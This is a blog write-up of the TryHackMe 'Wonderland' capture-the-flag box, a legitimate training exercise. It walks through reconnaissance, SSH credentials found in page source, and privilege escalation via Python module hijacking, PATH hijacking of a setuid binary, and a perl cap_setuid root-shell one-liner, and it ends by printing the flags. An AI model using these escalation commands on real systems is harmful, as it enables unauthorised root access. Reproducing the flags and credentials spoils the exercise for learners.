---
layout: post
title:  "THM - Wonderland"
date:   2020-07-09 18:00:00 +1000
category: hacking
---

## Introduction
*Enter Wonderland and capture the flags.*  

This is a medium ranked 'Alice in Wonderland' themed box. Let's begin.

## Ports
nmap says we've got 22 (SSH) and 80 (HTTP) only.  

## Webserver
*Follow the White Rabbit.*  
*"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)*

There is also a picture of the white rabbit from the story.

Running a gobuster on the homepage reveals an 'r' sub-directory, and a little intuition quickly reveals that there is a whole sequence of directories that looks like this:

>http://10.10.33.51/r/a/b/b/i/t

Actually we can also run steghide on the picture of the white rabbit from the front page with no password, and get the following hint: *follow the r a b b i t* (note the spaces!).

On the last directory, we get some more slightly cryptic text from the novel, and a picture of Alice. If we view the page source, we can see this:

>**alice:HowDothTheLittleCrocodileImproveHisShiningTail**

which are SSH credentials for user Alice.

## SSH
When we SSH in, we can run *sudo -l* and find out that Alice can run a python script as the user rabbit:

``
alice@wonderland:/dev/shm$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
``

The script is owned by root, so we can't edit it. However, when we look inside we can see it imports the 'random' module.

## The import trick
When we run a python import, the first place that python will look for the module to be imported is in the *same* directory that the script being run is in. So, we can make a *random.py* file in the directory with the script, and it will be imported instead of the 'real' random module.

The contents can be as simple as this:

>import os  
os.system("/bin/bash")

And next thing you know we're no longer alice, now we are rabbit.

## Rabbit
>rabbit@wonderland:/home/rabbit$ ls -lash  
snip
 20K -rwsr-sr-x 1 root   root    17K May 25 17:58 teaParty  
rabbit@wonderland:/home/rabbit$ file teaParty  
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped

As shown above, the user 'rabbit' has access to a custom binary called **teaParty** that is owned by root and which runs as the user 'hatter'.

Like using a sledgehammer to crack a walnut, we can disassemble the program with Ghidra, and the source is:

>void main(void)  
{  
  setuid(0x3eb);  
  setgid(0x3eb);  
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");  
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");  
  puts("Ask very nicely, and I will give you some tea while you wait for him");  
  getchar();  
  puts("Segmentation fault (core dumped)");  
  return;   
}  

So we can see it calls the Linux binary 'date' without a path, so we can create our own version of date and use that instead, very much like we did with the python module in the previous step. We begin by making a shell script called **date** in /dev/shm with the contents:

>#!/bin/bash  
echo "hatter incoming"  
/bin/bash  

Next, we append /dev/shm to our path:

``
rabbit@wonderland:/home/rabbit$ export PATH=/dev/shm:$PATH
``

And call ./teaParty. Boom, we are now 'hatter'.

## Hatter
Hatter has a file called 'password.txt' in his home directory, so now we can su as hatter from the other accounts if we want. The password is *WhyIsARavenLikeAWritingDesk?*

We can run linenum, and it doesn't show us *much*, but it does show this:

>[+] Capabilities  
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities  
/usr/bin/perl5.26.1 = cap_setuid+ep  
/usr/bin/mtr-packet = cap_net_raw+ep  
/usr/bin/perl = cap_setuid+ep  

Remember in Mindgames I said it's okay not to know everything, but it's good to learn something? Well, this looks *quite a lot* like the Mindgames privesc.

This [article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) explains it, and provides an example command for perl (which we need to modify slightly).

``
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
``

When we do this:

``
hatter@wonderland:~$ ls -al /usr/bin/perl
``

We can see that the user 'hatter' can run perl as root.  

>-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl

Since that's us, let's try:

>hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'  
root@wonderland:~#

And we're home and done. The flags are in /root.user.txt and /home/alice/root.txt

>home/alice/root.txt:thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}  
root/user.txt:thm{"Curiouser and curiouser!"}

## Summary
I enjoyed this box, it was a nice series of exploits moving from one user to another. Well done **NinjaJc01**

